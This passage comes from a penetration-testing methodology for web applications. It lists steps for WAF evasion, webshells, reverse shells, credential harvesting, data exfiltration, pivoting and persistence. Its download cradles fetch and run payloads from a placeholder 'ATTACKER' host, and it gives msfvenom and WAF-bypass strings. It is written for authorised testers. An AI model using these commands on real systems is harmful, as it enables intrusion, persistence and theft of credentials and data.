6. **Bypass account lockout** — distribute attempts across many usernames (password spraying), add delays between attempts, or reset lockout counters by completing partial auth flows
7. **Password spraying** — test one or two common passwords against all discovered usernames to avoid lockout

### WAF Detection & Bypass
See the following command references for syntax and examples:
- [sqlmap tamper scripts](commands.md)
- [Command Injection Filter Bypasses](payloads.md#command-injection-filter-bypasses)

1. **Detect WAF presence** — use wafw00f to identify the WAF vendor; different WAFs have different bypass techniques
2. **Identify blocked characters/patterns** — submit simple test payloads and observe which characters or keywords trigger blocking
3. **Case variation** — `SeLeCt`, `<ScRiPt>`, `uNiOn` to bypass case-sensitive signature matching
4. **URL encoding** — encode blocked characters (`%27` for `'`, `%3C` for `<`); try double encoding (`%2527`)
5. **Whitespace substitution** — replace spaces with `/**/`, `%09` (tab), `%0a` (newline), or `+` in SQL contexts
6. **Keyword splitting** — use `UN/**/ION`, `SEL/*comment*/ECT` to break up recognized keywords
7. **Use sqlmap tamper scripts** — `--tamper=space2comment,between,randomcase` for automated SQLi WAF bypass
8. **HTTP header manipulation** — add `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, or `X-Originating-IP: 127.0.0.1` — some WAFs whitelist internal IPs

### Webshell Management
1. **Use a minimal shell initially** — a one-liner PHP shell is less likely to be detected; upgrade only if needed
2. **Execute commands through the webshell** — pass commands via GET/POST parameter to run on the server
3. **Upgrade to a reverse shell** — use the webshell to execute a full reverse shell for an interactive session
4. **Upload additional tools** — use the webshell to download tools from your attack box for post-exploitation
5. **Note the webshell location for reporting** — document the exact path and how it was uploaded

## 5. Post-Exploitation

### From Web Shell to Reverse Shell
See the following command references for syntax and examples:
- [Reverse Shells](payloads.md#reverse-shells)
- [Shell Upgrade & Stabilization](payloads.md#shell-upgrade--stabilization)
- [msfvenom Payloads](payloads.md#msfvenom-payloads)

1. **Identify available interpreters** — check for bash, python, python3, perl, ruby, php, and nc on the target
2. **Execute a reverse shell one-liner** — use the appropriate reverse shell for the available interpreter and OS
3. **Use the webshell to download and execute** — if one-liners are blocked, download a reverse shell binary or script from your attack box and execute it
4. **Windows download cradles** — use `certutil -urlcache -f http://ATTACKER/shell.exe shell.exe` or PowerShell `IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')` on IIS targets
5. **msfvenom staged payloads** — generate `msfvenom -p linux/x64/shell_reverse_tcp` or Windows equivalent when one-liners are blocked by AV/filters
6. **Stabilize the shell** — follow Shell Handling & Stabilization steps from methodology.md
7. **Note your web server user** — web shells typically run as `www-data`, `apache`, `iis apppool\`, or similar low-privilege accounts

### Web Context Situational Awareness
1. **Identify the web application root** — find where the application files are stored; useful for reading source code and planting files
2. **Read application source code** — review config files for database credentials, API keys, and internal service connections
3. **Check database connection strings** — `wp-config.php`, `config.php`, `.env`, `web.config`, `appsettings.json` contain DB creds
4. **Enumerate other virtual hosts** — the web server may host multiple sites; check the web server config for all vhosts
5. **Check for internal services** — the web server may have local access to databases, caches, or APIs not exposed externally
6. **Review application logs** — web logs may contain credentials, internal paths, and other useful intelligence
7. **Check for container/Docker indicators** — look for `/.dockerenv`, check `/proc/1/cgroup` for container runtime strings; if containerized, enumerate for escape vectors (writable Docker socket, privileged mode, host mounts)

### Credential Harvesting from Web Applications
See the following command references for syntax and examples:
- [MSSQL](commands.md#mssql-port-1433)
- [MySQL](commands.md#mysql-port-3306)
- [database enumeration commands](commands.md)

1. **Extract database credentials from config files** — read connection strings and test credentials against the database and other services
2. **Dump application user tables** — connect to the database and extract usernames and password hashes; crack offline
3. **Check for hardcoded credentials in source** — search the codebase for passwords, API keys, and tokens
4. **Extract session tokens** — if you have filesystem access, read active session files for session hijacking
5. **Check environment variables** — run `env` or `printenv`; containerized and cloud-hosted apps frequently store secrets (DB passwords, API keys, cloud credentials) as env vars
6. **Check for AWS/cloud credentials** — `.aws/credentials`, environment variables, and instance metadata may contain cloud keys
7. **Search git history for secrets** — if the app directory is a git repo, run `git log -p` or `git grep password` to find credentials removed from current code but present in history

### Privilege Escalation from Web Context
- Follow Local Enumeration and Privilege Escalation steps from [methodology.md](methodology.md)
- **First check:** run `sudo -l` as the web user — web service accounts sometimes have misconfigured sudo rules
- **Priority checks from web user:** sudo rights for web user, SUID binaries, writable cron jobs, services running as root that the web user can interact with
- **Database user to OS user** — if DB credentials are found, check if the same password works for OS user accounts
- **Writable web root** — if running as a low-priv user but the web root is writable, plant a persistent webshell before attempting privesc

### Data Exfiltration
1. **Identify high-value targets** — database dumps, config files, source code, credential files, PII, and internal documentation
2. **Dump the application database** — use `mysqldump`, `pg_dump`, or `sqlcmd` to export the full database; compress before transfer
3. **Archive sensitive files** — use `tar`, `zip`, or `7z` to bundle config files, source code, and credential stores for transfer
4. **Transfer files to attack box** — use `wget`, `curl`, `scp`, `nc`, or Python HTTP server; refer to File Transfer Techniques in methodology.md
5. **Exfiltrate via DNS** — if direct outbound connections are blocked, encode data in DNS queries to an attacker-controlled resolver
6. **Document what was exfiltrated** — record all files accessed and exfiltrated for accurate reporting; do not retain actual sensitive data beyond the engagement

### Pivoting from Web Server
See the following command references for syntax and examples:
- [Pivoting & Tunneling](commands.md#pivoting--tunneling)
- [Chisel](commands.md#chisel)
- [SSH Tunnels](commands.md#ssh-tunnels)

1. **Enumerate network interfaces** — run `ip a` or `ifconfig`; web servers are frequently multi-homed with access to internal DB and app networks
2. **Scan for internal hosts** — use the web server as a pivot point to reach internal subnets not accessible from outside; use ping sweeps, nmap via proxychains, or a simple bash/PowerShell sweep
3. **Identify internal services** — common internal targets reachable from web servers: database servers (3306, 5432, 1433), Redis (6379), internal admin panels, LDAP/AD (389)
4. **Set up a SOCKS proxy** — use SSH local port forwarding, Chisel, or Metasploit routing to tunnel traffic through the web server into the internal network
5. **Target the database server** — if the web server has DB credentials, connect directly to the database host; it may be on an internal segment with weaker controls
6. **Check for AD connectivity** — web servers in corporate environments often have domain membership or can reach domain controllers; check for `realm list`, `/etc/krb5.conf`, or Windows domain join
7. **Refer to Pivoting & Tunneling** — follow detailed pivoting steps from Section 6 in methodology.md

### Persistence on Web Server
1. **Plant a persistent webshell** — copy a webshell to multiple locations in the web root with non-obvious names; document all locations for cleanup
2. **Add SSH authorized key** — if the web user has a home directory with `.ssh/`, append your public key to `authorized_keys` for persistent SSH access
3. **Write a cron job** — add a cron entry that periodically executes a reverse shell callback; use `/etc/cron.d/` or the web user's crontab
4. **Modify application code** — insert a backdoor into a frequently-executed application file; very persistent but high risk of detection and must be cleaned up
5. **Note: clean up all persistence** — document and remove all persistence mechanisms at the end of the engagement; webshells and backdoors left behind are a critical finding against yourself

## 6. Lateral Movement
- See [methodology.md](methodology.md)

## 7. Privilege Escalation
- See [methodology.md](methodology.md)

## 8. Active Directory Attacks
- See [methodology.md](methodology.md)

## 9. Reporting
- See [methodology.md](methodology.md)

